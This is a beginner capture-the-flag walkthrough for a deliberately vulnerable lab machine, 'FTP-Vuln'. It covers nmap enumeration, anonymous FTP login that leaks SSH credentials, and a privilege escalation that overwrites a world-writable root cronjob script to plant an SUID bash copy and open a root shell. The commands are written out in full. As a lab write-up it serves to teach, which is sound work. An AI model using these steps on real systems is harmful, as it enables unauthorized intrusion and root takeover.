# FTP-Vuln
FTP-Vuln is a beginner-level machine designed to teach how to identify and exploit misconfigurations in network protocols. The goal is to escalate from basic user access to root access through a series of logical and accessible steps.
Write-Up: ftp-vuln – Boot-to-Root Walkthrough

Overview

Difficulty: Beginner

Target OS: Ubuntu Server 20.04

Services: FTP, SSH

Flags:

/home/thmuser/user.txt

/root/root.txt



Step 1: Service Enumeration

We begin by scanning the machine with nmap to discover open ports and service versions:

nmap -sC -sV -Pn <TARGET_IP>

Results:

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.x

Both FTP and SSH are open. Let's investigate FTP first.



Step 2: Anonymous FTP Access

Attempting to connect to the FTP server with anonymous login:

ftp <TARGET_IP>
Name: anonymous
Password: [ENTER]

Inside the FTP session, we list and download files from the files directory:

cd files
ls
get leeme.txt

The file leeme.txt contains the following credentials:

credenciales: thmuser:123456



Step 3: SSH Access

Now that we have valid credentials, we connect via SSH:

ssh thmuser@<TARGET_IP>
# Password: 123456

Once inside the system, we retrieve the first flag:

cat /home/thmuser/user.txt

Flag 1:

TryHackMe{user_flag}


Step 4: Privilege Escalation - Cronjob Discovery

We begin local enumeration to identify privilege escalation vectors:

cat /etc/cron.d/rootjob

Output:

* * * * * root /usr/local/bin/backup.sh

Checking the script:

ls -l /usr/local/bin/backup.sh

It has 777 permissions (-rwxrwxrwx), meaning any user can modify it.


Step 5: Exploit the Cronjob

We edit the vulnerable cronjob script to copy /bin/bash with the SUID bit set:

echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh

Wait about 1 minute for the cronjob to run. Then:

/tmp/rootbash -p
whoami

Output:

root

We now have a root shell.



Step 6: Capture the Final Flag

With root access, we can now retrieve the second and final flag:

cat /root/root.txt

Flag 2:

TryHackMe{root_flag}


Summary

Step	Action	Result

1	Service enumeration with Nmap	Found FTP and SSH
2	Anonymous FTP access	Leaked user credentials
3	SSH login with leaked creds	Gained access as thmuser
4	Found vulnerable root cronjob	/usr/local/bin/backup.sh
5	Injected payload for root shell	Root via cronjob
6	Captured user.txt and root.txt	Machine fully pwned 

Machine created by: orami
